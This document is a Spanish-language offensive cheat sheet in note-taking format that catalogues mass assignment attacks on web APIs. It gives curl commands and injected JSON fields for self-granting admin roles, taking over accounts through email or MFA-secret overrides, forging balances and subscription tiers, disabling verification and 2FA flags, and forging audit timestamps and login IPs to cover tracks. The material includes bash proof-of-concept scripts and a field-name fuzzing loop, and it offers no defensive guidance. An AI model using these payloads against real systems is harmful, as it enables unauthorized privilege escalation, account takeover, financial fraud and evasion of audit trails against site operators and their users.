---
aliases:
  - Mass Assignment Privesc
  - Mass Assignment ATO
  - Mass Assignment Financial
tags:
  - type/technique
  - vuln/mass-assignment
  - technique/privilege-escalation
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Mass Assignment]]'
---
# Mass Assignment - Vectores Comunes

***

## Privilege Escalation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/api/signup -d '{"email":"x@y.z","password":"x","isAdmin":true}'` | Cuenta nueva con `isAdmin=true` | Signup acepta isAdmin sin filtrar. |
| Inject `"is_admin": true` en cualquier mutation/PUT | Privesc Python/Ruby naming | Backend Rails / Django / Flask. |
| Inject `"role": "admin"` (probar `administrator`, `superadmin`, `root`) | Role string-based privesc | Role como string field. |
| Inject `"roles": ["admin","user"]` | Multi-role array | App con array de roles. |
| Inject `"permissions": ["*"]` o `["read","write","delete"]` | Granular permissions privesc | RBAC granular. |
| Inject `"is_superuser": true` y `"is_staff": true` | Django superuser + admin panel | Backend Django. |
| Inject `"groups": ["admins"]` | LDAP-style group membership | Apps con LDAP groups. |
| Inject `"tier": "enterprise"` o `"plan": "premium"` | Paywall bypass | Tier/plan field mutable. |
| Inject `"level": 99` o `"access_level": "admin"` | Numeric/enum privesc | Sistemas tier-based. |
| Inject `"scope": "admin read write"` | OAuth scope inject | Apps con scope field plain. |
| `for f in isAdmin is_admin admin role roles permissions; do curl ... -d "{\"$f\":true}"; done` | Fuzz field names rapido | No conocés naming convention. |
^ma-vector-privesc

### PoC privilege escalation

```bash
# Self-register con isAdmin
curl -X POST https://target/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"atacante@evil.com","password":"P@ssw0rd","name":"User","isAdmin":true,"role":"admin"}'

# Login + verify privesc
TOKEN=$(curl -s -X POST https://target/api/login \
  -d '{"email":"atacante@evil.com","password":"P@ssw0rd"}' | jq -r .token)

curl https://target/api/admin/users -H "Authorization: Bearer $TOKEN"
# 200 OK → privesc successful
```

___

## Account Takeover

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PUT https://target/api/profile -d '{"id":1}'` | Hijack identity user 1 | Backend deja override del id en profile update. |
| Inject `"user_id": 1` o `"_id": 1` | Same effect, naming variants | Mongo / SQL convention. |
| Inject `"email": "victim@target.com","email_verified": true` en PUT /profile | Linked email-based ATO | Backend permite email change sin re-confirm. |
| Inject `"username": "admin"` | Username swap → admin pretendiente | Username mutable. |
| Inject `"password_hash": "$2b$10$<hash_conocido>"` | Set password hash directo | Backend acepta hash crudo. |
| Inject `"password_reset_token": "ATTACKER_TOKEN"` | Pre-set propio reset token | Token mutable via mass assign. |
| Inject `"mfa_secret": "BASE32SECRETMINE"` | Atacante controla TOTP de victim | MFA secret mutable. |
| Inject `"api_key": "atacante_api_key"` | Pre-asignar API key conocida | API key field mutable. |
| Inject `"oauth_id": "victim_google_id"` | Federated identity hijack | OAuth ID swap. |
| Inject `"email_verified": true,"phone_verified": true,"mfa_enabled": false` | Skip todas las verificaciones | Verification flags mutables. |
| Inject `"linked_accounts": [{...}]` | Override OAuth linked accounts | Linked array mutable. |
^ma-vector-ato

### Email-based ATO

```bash
# Backend: PUT /api/profile updates user fields
# Si backend permite email change sin re-confirmation:

curl -X PUT https://target/api/profile \
  -H "Authorization: Bearer $MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com","email_verified":true}'

# Now my own account claims victim's email
# Trigger password reset → reset link va al email "victim@target.com" que ahora es mío
```

___

## Financial / Quota Fields

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject `"balance": 99999999` en PUT/PATCH | Forge balance de cuenta | Balance mutable. |
| Inject `"credits": 99999999` o `"points": 99999999` o `"tokens": 99999999` | App credits/points/tokens forge | Loyalty/credits sistema. |
| Inject `"wallet": 99999999` | Wallet balance forge | Wallet field mutable. |
| Inject `"tier": "enterprise"` o `"subscription_status": "active"` | Paywall + subscription bypass | Tier/subscription mutable. |
| Inject `"subscription_expires_at": "2099-12-31"` | Extender subscripción | Expires field mutable. |
| Inject `"trial_extended": true` | Bypass trial cap | Trial flag mutable. |
| Inject `"quota_used": 0,"quota_limit": 99999999` | Reset usage + raise limit | Quota fields mutables. |
| Inject `"discount": 100` | Force discount máximo | Discount mutable. |
| Inject `"tax_rate": 0` en checkout/order PUT | Skip tax | Tax mutable. |
| Inject `"referral_credit": 99999999` | Forge referral credits | Referral abuse. |
^ma-vector-financial

___

## Status Flags

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject `"is_active": true` | Re-activar cuenta deshabilitada | Disabled accounts. |
| Inject `"is_verified": true,"email_verified": true,"phone_verified": true,"kyc_verified": true` | Skip todas las verificaciones | Verification flags mutables. |
| Inject `"mfa_enabled": false,"mfa_setup_complete": false` | Disable 2FA propio o de otro user | MFA fields mutables. |
| Inject `"is_blocked": false,"is_banned": false` | Self-unban / unblock | Punitive flags mutables. |
| Inject `"password_change_required": false,"force_logout": false` | Persist session forzada | Forced reset bypass. |
| Inject `"terms_accepted": true,"tutorial_completed": true` | Skip ToS / onboarding gates | Initial-flow bypass. |
| Inject `"is_public": true` en docs/profile | Visibility hijack — exponer items privados | Visibility mutable. |
| Inject `"is_locked": false` en order/transaction | Re-abrir transaction cerrada | Lock flag mutable. |
^ma-vector-status

___

## Audit Fields (Backdating / Cover Tracks)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject `"created_at": "1970-01-01T00:00:00Z"` | Backdate creation | created_at mutable. |
| Inject `"updated_at": "1970-01-01T00:00:00Z"` | Forge update timestamp | Cover modificación reciente. |
| Inject `"deleted_at": null` | Restore soft-deleted record | Soft-delete bypass. |
| Inject `"created_by": 1` o `"modified_by": 1` | Forge author/editor | Audit trail forge. |
| Inject `"version": 1` o `"revision": 0` | Optimistic lock bypass | Concurrency control bypass. |
| Inject `"audit_log_id": null` | Detach del audit log | Trail removal. |
| Inject `"last_login_ip": "127.0.0.1","last_login_at": "..."` | Forge login forensics | Internal trust + cover tracks. |
| Inject `"ip_address": "127.0.0.1"` | Internal IP trust bypass | App con IP-based ACL. |
| Inject `"user_agent": "Mozilla/5.0 ..."` | Forge UA en logs | Forensics evasion. |
^ma-vector-audit

***
